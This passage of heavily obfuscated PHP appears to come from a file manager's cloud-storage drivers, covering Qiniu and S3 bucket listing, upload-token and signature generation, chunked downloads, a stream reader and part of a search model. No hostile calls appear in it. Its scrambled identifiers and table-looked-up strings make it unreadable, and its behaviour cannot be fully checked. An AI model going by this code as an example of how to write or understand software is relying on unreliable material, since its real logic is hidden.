$Ğø¾é– =& $_SERVER[èÍ×öˆøÉ]; $™ÓØä£‘ = trim($™ÓØä£‘, $Ğø¾é–[8]); $ıûÊæƒ± = empty($™ÓØä£‘) && $™ÓØä£‘ !== $Ğø¾é–[191] ? $Ğø¾é–[33] : $™ÓØä£‘ . $Ğø¾é–[8]; $ÛßÑ†‡İ = $Ğø¾é–[33]; $œç–„” = 500; $¥Áİ¿ = $Ğø¾é–[8]; $’œ” = $Ô¶¥ûçšÏµ© = 0; while (!0) { check_abort(); list($ø˜‰ñş¡, $Ê¦) = $this->bucketManager->listFiles($this->bucket, $ıûÊæƒ±, $ÛßÑ†‡İ, $œç–„”, $¥Áİ¿); if ($Ê¦) { break; } $ÛßÑ†‡İ = array_key_exists($Ğø¾é–[1324], $ø˜‰ñş¡) ? $ÛßÑ†‡İ = $ø˜‰ñş¡[$Ğø¾é–[1357]] : $Ğø¾é–[33]; if ($œ¡„Öíüç„Ñ) { if (!empty($ø˜‰ñş¡[$Ğø¾é–[1358]])) { $’œ” += count($ø˜‰ñş¡[$Ğø¾é–[1358]]); } if (!empty($ø˜‰ñş¡[$Ğø¾é–[1359]])) { $Ô¶¥ûçšÏµ© += count($ø˜‰ñş¡[$Ğø¾é–[1359]]); } if ($ÛßÑ†‡İ === $Ğø¾é–[33]) { break; } continue; } if ($‡²åØÆ“ã) { if (!empty($ø˜‰ñş¡[$Ğø¾é–[1358]])) { return !0; } } else { if (!empty($ø˜‰ñş¡[$Ğø¾é–[1359]])) { return !0; } } if ($ÛßÑ†‡İ === $Ğø¾é–[33]) { break; } } if ($œ¡„Öíüç„Ñ) { return array($Ğø¾é–[203] => $’œ”, $Ğø¾é–[204] => $Ô¶¥ûçšÏµ©); } return !1; } public function listAll($ÑÅ§„É‹© ) { $©èÉåŞ =& $_SERVER[èÍ×öˆøÉ]; $¢¥¥£¦ = $this->fileList($ÑÅ§„É‹© , $©èÉåŞ[33], !0); $‚¬ïÖ = array(); foreach ($¢¥¥£¦[$©èÉåŞ[74]] as $Ä§šİÇ©ñ) { $‚¬ïÖ[$Ä§šİÇ©ñ[$©èÉåŞ[93]]] = $Ä§šİÇ©ñ[$©èÉåŞ[78]]; } foreach ($¢¥¥£¦[$©èÉåŞ[75]] as $Ä§šİÇ©ñ) { if (is_string($Ä§šİÇ©ñ)) { $‚¬ïÖ[$Ä§šİÇ©ñ] = 0; } } return $this->listAllFiles($ÑÅ§„É‹© , array_keys($‚¬ïÖ), $‚¬ïÖ); } private function fileList($øßîäªÅŒµ, $™ØªÎ£™ÂòŒ = '', $ ”ÅÅæ = 0) { $÷Î…ÅÔ =& $_SERVER[èÍ×öˆøÉ]; $øßîäªÅŒµ = trim($øßîäªÅŒµ, $÷Î…ÅÔ[8]); $€ö¥á = empty($øßîäªÅŒµ) && $øßîäªÅŒµ !== $÷Î…ÅÔ[191] ? $÷Î…ÅÔ[33] : $øßîäªÅŒµ . $÷Î…ÅÔ[8]; $‹…ëÄÄŸ ü— = $÷Î…ÅÔ[33]; $¿ªÚÚ• = 1000; $£Ë = $this->listItemCache === !1 ? !1 : !0; $ëÛ÷Ê€ = $äì = array(); while (!0) { check_abort(); list($ò, $Ñ¡ÍÀ™Š) = $this->bucketManager->listFiles($this->bucket, $€ö¥á, $‹…ëÄÄŸ ü—, $¿ªÚÚ•, $™ØªÎ£™ÂòŒ); if ($Ñ¡ÍÀ™Š) { break; } $‹…ëÄÄŸ ü— = array_key_exists($÷Î…ÅÔ[1324], $ò) ? $‹…ëÄÄŸ ü— = $ò[$÷Î…ÅÔ[1357]] : $÷Î…ÅÔ[33]; $Ú¥ÖÁ·’ = isset($ò[$÷Î…ÅÔ[1358]]) ? $ò[$÷Î…ÅÔ[1358]] : array(); $³ö™­ = isset($ò[$÷Î…ÅÔ[1359]]) ? $ò[$÷Î…ÅÔ[1359]] : array(); foreach ($Ú¥ÖÁ·’ as $€®Öùã) { if ($€®Öùã[$÷Î…ÅÔ[93]] == $€ö¥á) { continue; } $²ÉŠ¸Óì = $€®Öùã[$÷Î…ÅÔ[93]]; $ó¸ç® = $€®Öùã[$÷Î…ÅÔ[1355]]; $€®Öùã[$÷Î…ÅÔ[78]] = $ó¸ç®; $¬Ì = $ó¸ç® == 0 && substr($²ÉŠ¸Óì, strlen($²ÉŠ¸Óì) - 1, 1) == $÷Î…ÅÔ[8] ? !0 : !1; if ($£Ë) { $this->cacheMethod($÷Î…ÅÔ[199], $²ÉŠ¸Óì, $¬Ì); $this->cacheMethod($÷Î…ÅÔ[200], $²ÉŠ¸Óì, $€®Öùã); } if ($¬Ì) { $ëÛ÷Ê€[] = $²ÉŠ¸Óì; continue; } $äì[] = $ ”ÅÅæ ? $€®Öùã : $²ÉŠ¸Óì; } foreach ($³ö™­ as $²ÉŠ¸Óì) { if ($²ÉŠ¸Óì == $€ö¥á) { continue; } $ëÛ÷Ê€[] = $²ÉŠ¸Óì; if ($£Ë) { $this->cacheMethod($÷Î…ÅÔ[199], $²ÉŠ¸Óì, !0); } } if ($‹…ëÄÄŸ ü— === $÷Î…ÅÔ[33]) { break; } } if ($£Ë) { $this->cacheMethod($÷Î…ÅÔ[199], $øßîäªÅŒµ, !0); } return array($÷Î…ÅÔ[75] => $ëÛ÷Ê€, $÷Î…ÅÔ[74] => $äì); } public function canRead($±È€è›) { return $this->exist($±È€è›) ? !0 : !1; } public function canWrite($ ¸Ø£’õ) { return $this->exist($ ¸Ø£’õ) ? !0 : !1; } public function getContent($®ÍÆ”ØÈşÅ÷) { return $this->fileSubstr($®ÍÆ”ØÈşÅ÷, 0, -1); } public function setContent($Óçô«˜ØÚ, $¦à¶Îç³¨Œ = '') { $¸¸±½ëÇ†ğ = $this->tempFile($this->pathThis($Óçô«˜ØÚ)); file_put_contents($¸¸±½ëÇ†ğ, $¦à¶Îç³¨Œ); if ($this->upload($Óçô«˜ØÚ, $¸¸±½ëÇ†ğ)) { $this->tempFileRemve($¸¸±½ëÇ†ğ); return !0; } return !1; } public function refreshUrls($°¢”»Œµª†½) { $±Ôøæ‘‘« =& $_SERVER[èÍ×öˆøÉ]; $¯Õøí´“©Ñƒ = array(); if (is_array($°¢”»Œµª†½)) { foreach ($°¢”»Œµª†½ as $»Î·Ó Ì) { $¯Õøí´“©Ñƒ[] = $this->link($»Î·Ó Ì); } } else { $¯Õøí´“©Ñƒ[] = $this->link($°¢”»Œµª†½); } $¨ˆÒ ››ú²ğ = new Qiniu\Cdn\CdnManager($this->auth); list($‚ïå, $¥¸“Œé) = $¨ˆÒ ››ú²ğ->refreshUrls($¯Õøí´“©Ñƒ); if ($¥¸“Œé) { return !1; } return $‚ïå[$±Ôøæ‘‘«[1116]] == $±Ôøæ‘‘«[755] ? !0 : !1; } public function fileSubstr($‹Ğºèñ¢î, $Óª˜ , $ï™) { $§¬®˜­äÈÄƒ =& $_SERVER[èÍ×öˆøÉ]; if (!($¦—¨¢ = $this->link($‹Ğºèñ¢î))) { return !1; } $şÊä¿³ = !1; if ($ï™ > 0) { $­©—½‡æõíÖ = $Óª˜  + $ï™ - 1; $şÊä¿³ = array($§¬®˜­äÈÄƒ[1360] . $Óª˜  . $§¬®˜­äÈÄƒ[454] . $­©—½‡æõíÖ); } $º©èè£ = url_request($¦—¨¢, $§¬®˜­äÈÄƒ[228], !1, $şÊä¿³); return $º©èè£[$§¬®˜­äÈÄƒ[745]] ? $º©èè£[$§¬®˜­äÈÄƒ[1126]] : !1; } public function upload($ÏÅÄ, $í£²Ö€Ë, $ãŒßÒ”¢ = false, $õĞÊŸŸË§¬ = REPEAT_REPLACE) { $Ïö = new Qiniu\Storage\UploadManager(); $ÁÃ = $this->auth->uploadToken($this->bucket, $ÏÅÄ); $É×æİ = get_file_mime(get_path_ext($í£²Ö€Ë)); list($™è, $‹Öö‰) = $Ïö->putFile($ÁÃ, $ÏÅÄ, $í£²Ö€Ë, null, $É×æİ); return $‹Öö‰ ? !1 : $this->getPathOuter($ÏÅÄ); } public function uploadFormData($š¾ôç©, $•×íÜ÷İİñ = 3600) { return $this->uploadToken($š¾ôç©, $•×íÜ÷İİñ); } public function multiUploadFormData($ç“Ö‘¿, $ ©¼Ó»ƒ£à = 3600) { return $this->uploadToken($ç“Ö‘¿, $ ©¼Ó»ƒ£à); } private function uploadToken($êõéÄ®, $…¾ÆÜå‰ = 3600) { $€ Êêì›¥ =& $_SERVER[èÍ×öˆøÉ]; $°ÛääÉŞñ«ª = $…¾ÆÜå‰; $ë«°Æ¨ = array($€ Êêì›¥[1361] => $€ Êêì›¥[1362]); $Ñ†˜£ş = $êõéÄ®; $Æ‹¥ = $this->auth->uploadToken($this->bucket, $Ñ†˜£ş, $°ÛääÉŞñ«ª, $ë«°Æ¨, !0); $æŠ÷°¡§˜˜… = empty($this->region) || $this->region == $€ Êêì›¥[1363] ? $€ Êêì›¥[33] : $€ Êêì›¥[454] . $this->region; $Öá‹·åõ = http_type() . "\72\57\x2f\x75\160\x6c\x6f\141\144{$æŠ÷°¡§˜˜…}\56\x71\x69\156\x69\165\160\x2e\143\157\x6d\57"; return array($€ Êêì›¥[1364] => $Æ‹¥, $€ Êêì›¥[1365] => $Öá‹·åõ); } public function download($¿, $ÅÌ) { $’•› = IO::getPathInner(IO::mkfile($ÅÌ)); if (!($Û¾ = $this->link($¿))) { return !1; } $â“Ã¤‚šº§ = 0; $÷¢Ì§ŸáÃ¸Í™ = 1024 * 200; $·¬µ¶êÙ = fopen($’•›, $_SERVER[èÍ×öˆøÉ][1366]); while (!0) { $¤Ê¯Ûş = $this->fileSubstr($¿, $â“Ã¤‚šº§, $÷¢Ì§ŸáÃ¸Í™); if ($¤Ê¯Ûş === !1) { return !1; } fwrite($·¬µ¶êÙ, $¤Ê¯Ûş); $â“Ã¤‚šº§ += $÷¢Ì§ŸáÃ¸Í™; if (strlen($¤Ê¯Ûş) < $÷¢Ì§ŸáÃ¸Í™) { break; } } fclose($·¬µ¶êÙ); return $ÅÌ; } public function link($¨±÷Ü·, $‰·Á¼è¼ïŞ = '') { if (!$this->isFile($¨±÷Ü·)) { return !1; } $›Õ”¤šş° = $this->getHost() . $_SERVER[èÍ×öˆøÉ][8] . $this->pathEncode($¨±÷Ü·) . $‰·Á¼è¼ïŞ; return $this->auth->privateDownloadUrl($›Õ”¤šş°, 3600 * 12); } public function fileOut($™„í‡Ã€Ù, $¢Úëš»åØ = false, $¢Í• = false, $à½¢· = '') { $¦éÖ² =& $_SERVER[èÍ×öˆøÉ]; if ($this->isFileOutServer()) { return $this->fileOutServer($™„í‡Ã€Ù, $¢Úëš»åØ, $¢Í•, $à½¢·); } if (!$¢Í•) { $¢Í• = $this->pathThis($™„í‡Ã€Ù); } $ŠšóÓÇ°ß = $¢Úëš»åØ ? $¦éÖ²[1367] . rawurlencode($¢Í•) : $¦éÖ²[33]; $¥ÆŒºî“óâ = $this->link($™„í‡Ã€Ù, $ŠšóÓÇ°ß); $this->fileOutLink($¥ÆŒºî“óâ); } public function fileOutServer($¼©Ã, $¢·Êª°¶ø¿’ = false, $€‹ÃØ›ä = false, $÷º„ˆ÷õ = '') { parent::fileOut($¼©Ã, $¢·Êª°¶ø¿’, $€‹ÃØ›ä, $÷º„ˆ÷õ); } public function fileOutImage($Õãåí¦¿òœ, $®ÏÓ“… = 250) { $úáÕ¼‚ÜÎœ = $this->link($Õãåí¦¿òœ, $_SERVER[èÍ×öˆøÉ][1368] . $®ÏÓ“…); $this->fileOutLink($úáÕ¼‚ÜÎœ); } public function fileOutImageServer($Üı“å, $ˆ = 250) { parent::fileOutImage($Üı“å, $ˆ); } public function hashMd5($ÕıÒ£”õ) { $±ÜÈ‘‚«¡ =& $_SERVER[èÍ×öˆøÉ]; $îÏÖ = $this->objectMeta($ÕıÒ£”õ); return isset($îÏÖ[$±ÜÈ‘‚«¡[208]]) ? $îÏÖ[$±ÜÈ‘‚«¡[208]] : !1; $¶û§ğ«Ù = $this->link($ÕıÒ£”õ, $±ÜÈ‘‚«¡[1369]); } public function size($Úòš÷çå) { $Ûı§ÈĞ = $this->objectMeta($Úòš÷çå); return $Ûı§ÈĞ ? $Ûı§ÈĞ[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function info($®¦‡Ó) { if ($this->isFolder($®¦‡Ó)) { return $this->folderInfo($®¦‡Ó); } else { if ($this->isFile($®¦‡Ó)) { return $this->fileInfo($®¦‡Ó); } } return !1; } public function exist($¿¥Øœ‹–) { return $this->isFile($¿¥Øœ‹–) || $this->isFolder($¿¥Øœ‹–); } public function isFile($‹îØî©©à) { return !$this->isFolder($‹îØî©©à) && $this->objectMeta($‹îØî©©à); } public function isFolder($•­) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][199], $•­); } protected function objectMeta($ÃÈà»¯„Óœûş) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][200], $ÃÈà»¯„Óœûş); } protected function _objectMeta($™×ãåéì¶ôõ³) { $şÅÌåâ“›Ñ =& $_SERVER[èÍ×öˆøÉ]; list($ÀıŸé˜ŸÈ, $´½åœê×é›ï) = $this->bucketManager->stat($this->bucket, $™×ãåéì¶ôõ³); if ($ÀıŸé˜ŸÈ) { $ÀıŸé˜ŸÈ[$şÅÌåâ“›Ñ[78]] = intval($ÀıŸé˜ŸÈ[$şÅÌåâ“›Ñ[1355]]); } return $ÀıŸé˜ŸÈ; } protected function _isFolder($çé‹³Ášã®Â) { $¿§¡ =& $_SERVER[èÍ×öˆøÉ]; if ($çé‹³Ášã®Â == $¿§¡[33] || $çé‹³Ášã®Â == $¿§¡[8]) { return !0; } list($ßĞÏ–¡, $¡¼Ù¾) = $this->bucketManager->listFiles($this->bucket, trim($çé‹³Ášã®Â, $¿§¡[8]) . $¿§¡[8], $¿§¡[33], 1, $¿§¡[8]); return !empty($ßĞÏ–¡[$¿§¡[1358]]) || !empty($ßĞÏ–¡[$¿§¡[1359]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($†ÅÅ™) { parent::__construct($†ÅÅ™); } public function uploadFormData($ÈÑâÓ¢ªÁÇ, $İ‹ä¿öŠ = 3600) { $ßùÖ•’èàƒ =& $_SERVER[èÍ×öˆøÉ]; $Ší = $ßùÖ•’èàƒ[192]; $Ñ´ãò€Ìãê” = $ßùÖ•’èàƒ[1274]; $´ÇĞ©• = $ßùÖ•’èàƒ[59]; $êåŠ£ª‘×Ë = gmdate($ßùÖ•’èàƒ[1275]); $Õµ‰ù = gmdate($ßùÖ•’èàƒ[746]); $öˆ = $ßùÖ•’èàƒ[1276]; $¦˜Â®êœíÏø¿ = $İ‹ä¿öŠ . $ßùÖ•’èàƒ[33]; $¶¡’üæ€“ü­ = $ßùÖ•’èàƒ[1239]; $Ìµ = array($this->accessKey, $Õµ‰ù, $this->region, $´ÇĞ©•, $öˆ); $âù³â® = implode($ßùÖ•’èàƒ[8], $Ìµ); $×ş = array($ßùÖ•’èàƒ[1241] => gmdate($ßùÖ•’èàƒ[1240], strtotime($ßùÖ•’èàƒ[1277])), $ßùÖ•’èàƒ[1242] => array(array($ßùÖ•’èàƒ[1244] => $this->bucket), array($ßùÖ•’èàƒ[1243] => $Ší), array($ßùÖ•’èàƒ[1245], $ßùÖ•’èàƒ[1246], $ßùÖ•’èàƒ[33]), array($ßùÖ•’èàƒ[1245], $ßùÖ•’èàƒ[1278], $ßùÖ•’èàƒ[33]), array($ßùÖ•’èàƒ[1245], $ßùÖ•’èàƒ[1279], $ßùÖ•’èàƒ[33]), array($ßùÖ•’èàƒ[1247] => $¶¡’üæ€“ü­), array($ßùÖ•’èàƒ[1280] => $âù³â®), array($ßùÖ•’èàƒ[1281] => $Ñ´ãò€Ìãê”), array($ßùÖ•’èàƒ[1282] => $êåŠ£ª‘×Ë), array($ßùÖ•’èàƒ[1283] => $¦˜Â®êœíÏø¿))); $Ü–õç = base64_encode(json_encode($×ş)); $û€Ü¸¦¨Ë’Ì = hash_hmac($ßùÖ•’èàƒ[1284], $Õµ‰ù, $ßùÖ•’èàƒ[1285] . $this->secret, !0); $ê¢ÅšÏÔòë = hash_hmac($ßùÖ•’èàƒ[1284], $this->region, $û€Ü¸¦¨Ë’Ì, !0); $­ßèç = hash_hmac($ßùÖ•’èàƒ[1284], $´ÇĞ©•, $ê¢ÅšÏÔòë, !0); $¿«Èâ = hash_hmac($ßùÖ•’èàƒ[1284], $öˆ, $­ßèç, !0); $ŒèÆ‘Õ¿õÌĞ = hash_hmac($ßùÖ•’èàƒ[1284], $Ü–õç, $¿«Èâ); $ù­ï± = array($ßùÖ•’èàƒ[211] => $ßùÖ•’èàƒ[33], $ßùÖ•’èàƒ[1286] => $ßùÖ•’èàƒ[33], $ßùÖ•’èàƒ[1243] => $Ší, $ßùÖ•’èàƒ[1247] => $¶¡’üæ€“ü­, $ßùÖ•’èàƒ[1251] => $Ü–õç, $ßùÖ•’èàƒ[1287] => $âù³â®, $ßùÖ•’èàƒ[1288] => $Ñ´ãò€Ìãê”, $ßùÖ•’èàƒ[1289] => $êåŠ£ª‘×Ë, $ßùÖ•’èàƒ[1290] => $¦˜Â®êœíÏø¿, $ßùÖ•’èàƒ[1291] => $ŒèÆ‘Õ¿õÌĞ, $ßùÖ•’èàƒ[175] => $this->getHost()); return $ù­ï±; } public function multiUploadFormData($ƒì, $°øºèÙ¼“È = 3600) { $ÅĞµëÒ›¡¦Ÿ =& $_SERVER[èÍ×öˆøÉ]; $»¼ö£ = gmdate($ÅĞµëÒ›¡¦Ÿ[1370]); $Ù¨¶èıµ = array(); $¥»³İ“«Ğ†¬ = $this->client->getUploadId($this->bucket, $ƒì, $Ù¨¶èıµ); if (!$¥»³İ“«Ğ†¬) { return !1; } return array($ÅĞµëÒ›¡¦Ÿ[221] => $¥»³İ“«Ğ†¬, $ÅĞµëÒ›¡¦Ÿ[175] => $this->getHost() . $ÅĞµëÒ›¡¦Ÿ[8] . $this->pathEncode($ƒì), $ÅĞµëÒ›¡¦Ÿ[222] => $»¼ö£, $ÅĞµëÒ›¡¦Ÿ[93] => $ƒì); } public function multiUploadAuthData($ÜäÒ‹×ğ„, $²˜÷ç…©£« = array()) { $„Ê¬‘¾¬ =& $_SERVER[èÍ×öˆøÉ]; $†Ø…Ü = isset($²˜÷ç…©£«[$„Ê¬‘¾¬[168]]) ? $²˜÷ç…©£«[$„Ê¬‘¾¬[168]] : $„Ê¬‘¾¬[33]; $ºÑ†Üü¶• = $²˜÷ç…©£«[$„Ê¬‘¾¬[93]]; unset($²˜÷ç…©£«[$„Ê¬‘¾¬[93]]); if (isset($²˜÷ç…©£«[$„Ê¬‘¾¬[223]])) { return $this->listUploadParts($ºÑ†Üü¶•, $²˜÷ç…©£«); } $ƒ™§Ë»µ = array(); if (isset($²˜÷ç…©£«[$„Ê¬‘¾¬[1371]])) { $ƒ™§Ë»µ[$„Ê¬‘¾¬[1372]] = $²˜÷ç…©£«[$„Ê¬‘¾¬[1371]]; } $† ïÁó = explode($„Ê¬‘¾¬[177], $this->getHost()); $†—°ş”‹½øæ = array($„Ê¬‘¾¬[1373] => $† ïÁó[1], $„Ê¬‘¾¬[1374] => $„Ê¬‘¾¬[33], $„Ê¬‘¾¬[211] => $„Ê¬‘¾¬[119], $„Ê¬‘¾¬[1286] => $²˜÷ç…©£«[$„Ê¬‘¾¬[78]]); $…ú¡†ëÒÏ = $„Ê¬‘¾¬[226]; $çß“ÃÀÓÆÒ = $„Ê¬‘¾¬[8] . $this->pathEncode($ºÑ†Üü¶•) . $†Ø…Ü; $Ô„Í = $this->client->__getSignatureV4($ƒ™§Ë»µ, $†—°ş”‹½øæ, $…ú¡†ëÒÏ, $çß“ÃÀÓÆÒ); if (strpos($†Ø…Ü, $„Ê¬‘¾¬[225]) === 0) { if (isset($ƒ™§Ë»µ[$„Ê¬‘¾¬[1372]])) { $²óÎ¹¸íƒÀ = $ƒ™§Ë»µ[$„Ê¬‘¾¬[1372]]; } else { if (isset($Ô„Í[$„Ê¬‘¾¬[1372]])) { $²óÎ¹¸íƒÀ = $Ô„Í[$„Ê¬‘¾¬[1372]]; } else { $²óÎ¹¸íƒÀ = hash($„Ê¬‘¾¬[1284], $„Ê¬‘¾¬[33]); } } return array($„Ê¬‘¾¬[232] => $Ô„Í[$„Ê¬‘¾¬[232]], $„Ê¬‘¾¬[1372] => $²óÎ¹¸íƒÀ, $„Ê¬‘¾¬[222] => $Ô„Í[$„Ê¬‘¾¬[1375]]); } return $Ô„Í[$„Ê¬‘¾¬[232]]; } public function listUploadParts($®›øŠ, $¸È×ÉÀÃİéê = array()) { $å›¦Ù’Ÿ· =& $_SERVER[èÍ×öˆøÉ]; $Õú = str_replace($å›¦Ù’Ÿ·[233], $å›¦Ù’Ÿ·[33], $¸È×ÉÀÃİéê[$å›¦Ù’Ÿ·[168]]); $ĞŸ¿ = $this->client->listParts($this->bucket, $®›øŠ, $Õú); if (!$ĞŸ¿) { return !1; } $´ÈÊ°ı = $å›¦Ù’Ÿ·[1376]; foreach ($ĞŸ¿ as $Ó¾í’ÕÍ) { $´ÈÊ°ı .= $å›¦Ù’Ÿ·[1377] . "\x3c\x50\x61\162\164\116\x75\155\142\x65\162\x3e{$Ó¾í’ÕÍ[$å›¦Ù’Ÿ·[1331]]}\74\x2f\x50\x61\162\164\116\165\155\142\x65\162\x3e\12" . "\74\x45\124\141\147\x3e{$Ó¾í’ÕÍ[$å›¦Ù’Ÿ·[1332]]}\74\x2f\105\124\x61\x67\76\xa" . $å›¦Ù’Ÿ·[1378]; } $´ÈÊ°ı .= $å›¦Ù’Ÿ·[1379]; $ì»É©ğ¹ÀÉï = array(); $›ï = explode($å›¦Ù’Ÿ·[177], $this->getHost()); $·ÔÉ = array($å›¦Ù’Ÿ·[1373] => $›ï[1], $å›¦Ù’Ÿ·[211] => $å›¦Ù’Ÿ·[119], $å›¦Ù’Ÿ·[1286] => strlen($´ÈÊ°ı)); $ëª¢öÜ¹æ† = $å›¦Ù’Ÿ·[224]; $‘ÏôÑÖ = $å›¦Ù’Ÿ·[8] . $this->pathEncode($®›øŠ) . $¸È×ÉÀÃİéê[$å›¦Ù’Ÿ·[168]]; $Ç = $this->client->__getSignatureV4($ì»É©ğ¹ÀÉï, $·ÔÉ, $ëª¢öÜ¹æ†, $‘ÏôÑÖ, $´ÈÊ°ı); return array($å›¦Ù’Ÿ·[232] => $Ç[$å›¦Ù’Ÿ·[232]], $å›¦Ù’Ÿ·[222] => $Ç[$å›¦Ù’Ÿ·[1375]], $å›¦Ù’Ÿ·[234] => $ĞŸ¿, $å›¦Ù’Ÿ·[1372] => $Ç[$å›¦Ù’Ÿ·[1372]]); } public function link($íç­ëÓ¸Ã, $ü¢Æü = array()) { return parent::link($íç­ëÓ¸Ã, $ü¢Æü); } public function fileOut($¥„µÊøùÁ°·, $ñ± = false, $Àñè²‘´¯ó = false, $èæ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[èÍ×öˆøÉ][1380])) { return parent::fileOutServer($¥„µÊøùÁ°·, $ñ±, $Àñè²‘´¯ó, $èæ); } parent::fileOut($¥„µÊøùÁ°·, $ñ±, $Àñè²‘´¯ó, $èæ); } public function fileOutImage($¤»õ¶Ï·½å, $€ÎÖì‹óÈ“©Œ = 250) { if (strstr($this->endpoint, $_SERVER[èÍ×öˆøÉ][1380])) { return parent::fileOutImageServer($¤»õ¶Ï·½å, $€ÎÖì‹óÈ“©Œ); } parent::fileOutImage($¤»õ¶Ï·½å, $€ÎÖì‹óÈ“©Œ); } public function fileOutLink($‡õãÛ¬‘) { $‡•üòÉĞğ =& $_SERVER[èÍ×öˆøÉ]; if (substr($‡õãÛ¬‘, 0, 7) == $‡•üòÉĞğ[1254]) { $‡õãÛ¬‘ = $‡•üòÉĞğ[1255] . substr($‡õãÛ¬‘, 7); } header($‡•üòÉĞğ[159] . $‡õãÛ¬‘); die; } public function getHost() { $«™øä®©‚ =& $_SERVER[èÍ×öˆøÉ]; $ĞÃí÷ = str_rtrim(parent::getHost(), $«™øä®©‚[8] . $this->bucket); $ĞÃí÷ = explode($«™øä®©‚[177], $ĞÃí÷); return $ĞÃí÷[0] . $«™øä®©‚[177] . $this->bucket . $«™øä®©‚[95] . $ĞÃí÷[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ú»šñŒİÕ, $ğğÃİ¨Ê = 0) { parent::__construct(); $this->source = $ú»šñŒİÕ; $this->sourceSize = $ğğÃİ¨Ê; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¥íÍŞ‘£ë Í = false) { return $this->sourceSize; } public function getContent($ííæ  = false) { return $this->fileSubstr($ííæ , 0, $this->sourceSize); } public function fileSubstr($Ú¯ û£€ã¢ıÖ = false, $‰ÕØâ¡­õ = 0, $üšŞ¿±ø = 0) { if (!$üšŞ¿±ø) { $üšŞ¿±ø = $this->sourceSize; } $ÄÉù˜ = $this->sourceSize - $‰ÕØâ¡­õ; if ($üšŞ¿±ø >= $ÄÉù˜) { $üšŞ¿±ø = $ÄÉù˜; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $‰ÕØâ¡­õ, $üšŞ¿±ø); } if ($this->sourceType == self::TYPE_FILE) { if ($üšŞ¿±ø <= 0) { return $_SERVER[èÍ×öˆøÉ][33]; } $º¯ÅŞöŠ©®Õ = ftell($this->source); fseek_64($this->source, $º¯ÅŞöŠ©®Õ + $‰ÕØâ¡­õ); $ñ¢ = @fread($this->source, $üšŞ¿±ø); fseek_64($this->source, $º¯ÅŞöŠ©®Õ); return $ñ¢; } } public function hashMd5($Š”’¡ = false) { return md5($this->getContent()); } public static function hash($¯ê£ÃïñŒ, $Øó÷ß¢ = 0) { $•Î¬÷ = new PathDriverStream($¯ê£ÃïñŒ, $Øó÷ß¢); return $•Î¬÷->hashSimple($¯ê£ÃïñŒ); } public static function md5($ëïÇËçó, $äòÁ‘œ«øıüø = 0) { $‰«¸¹à¡»„ = new PathDriverStream($ëïÇËçó, $äòÁ‘œ«øıüø); return $‰«¸¹à¡»„->hashMd5($ëïÇËçó); } } goto c×èâõÉ“Ï; C«Å¤¡³œƒ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¬Ìí­«Öú£) { $¨‰£ =& $_SERVER[èÍ×öˆøÉ]; $ü©œÆ­öÖ† = KodIO::fileTypeList(); $Ãïë¸ÕäÑìÚ = $ü©œÆ­öÖ†[$¬Ìí­«Öú£]; if (!$Ãïë¸ÕäÑìÚ) { return array(); } $‡½ëıåØÒû = $Ãïë¸ÕäÑìÚ[$¨‰£[168]]; $º­Ö¾Â = $¨‰£[7]; if (!$Ãïë¸ÕäÑìÚ[$¨‰£[168]]) { $öª = array_to_keyvalue($ü©œÆ­öÖ†, $¨‰£[33], $¨‰£[168]); $‡½ëıåØÒû = implode($¨‰£[47], $öª); $º­Ö¾Â = $¨‰£[1995]; } $ÛŠ‡¿‚ = explode($¨‰£[47], trim($‡½ëıåØÒû, $¨‰£[47])); return array($º­Ö¾Â, $ÛŠ‡¿‚); } public function listPathType($ËÍÏ½) { $ãŸ =& $_SERVER[èÍ×öˆøÉ]; $µ¤ğ… = $this->fileTypeWhere($ËÍÏ½); if (!$µ¤ğ…) { return array(); } $¶²­ÙÊŞÂ¹áè = array($ãŸ[574] => SourceModel::TYPE_USER, $ãŸ[575] => USER_ID, $ãŸ[571] => 0, $ãŸ[572] => $µ¤ğ…); return $this->listSource($¶²­ÙÊŞÂ¹áè); } public function listSearch($é°Â¨è, $³Á÷á‡ = 300) { $Ó”ÚÌ¬ıˆ¸ =& $_SERVER[èÍ×öˆøÉ]; if (isset($é°Â¨è[$Ó”ÚÌ¬ıˆ¸[1840]]) && $é°Â¨è[$Ó”ÚÌ¬ıˆ¸[1840]]) { $é°Â¨è[$Ó”ÚÌ¬ıˆ¸[1840]] = str_replace($Ó”ÚÌ¬ıˆ¸[382], $Ó”ÚÌ¬ıˆ¸[1996], trim($é°Â¨è[$Ó”ÚÌ¬ıˆ¸[1840]])); } $Êº’Ï’¤³¶ = $this->_parseSearchWhere($é°Â¨è); $°·À€¥ÉÎé× = $Êº’Ï’¤³¶; if (!isset($Êº’Ï’¤³¶[$Ó”ÚÌ¬ıˆ¸[425]])) { $Êº’Ï’¤³¶[$Ó”ÚÌ¬ıˆ¸[425]] = 0; } $µÃí–ƒ´õƒµ© = $Ó”ÚÌ¬ıˆ¸[1997]; $Ô¶æİ×Ïæª² = $µÃí–ƒ´õƒµ©; $this->_listSearchBindPinyin($é°Â¨è, $Êº’Ï’¤³¶, $µÃí–ƒ´õƒµ©); $this->alias($Ó”ÚÌ¬ıˆ¸[438])->_makeOrder(); $Êº’Ï’¤³¶ = $this->parseWhereLike($Êº’Ï’¤³¶); $âœõ£ = $this->distinct(!0)->field($µÃí–ƒ´õƒµ©)->where($Êº’Ï’¤³¶)->selectPage($³Á÷á‡); $this->_listSearchFileContent($âœõ£, $é°Â¨è, $Ô¶æİ×Ïæª², $°·À€¥ÉÎé×); $this->_listSearchDesc($âœõ£, $é°Â¨è, $Ô¶æİ×Ïæª²); $this->_listSearchTag($âœõ£, $é°Â¨è, $Ô¶æİ×Ïæª²); $this->_listSearchGroupTag($âœõ£, $é°Â¨è, $Ô¶æİ×Ïæª²); $this->_listDataApply($âœõ£[$Ó”ÚÌ¬ıˆ¸[367]]); $this->_listMake($âœõ£); return $âœõ£; } private function _listSearchFileContent(&$ÁèİıÃ, $–Äö, $ŞÄ´ÙêÑ°â±, $âÆêŞÁÖ†®ß¼) { $Æóó—ÔœÔ‰ş» =& $_SERVER[èÍ×öˆøÉ]; if 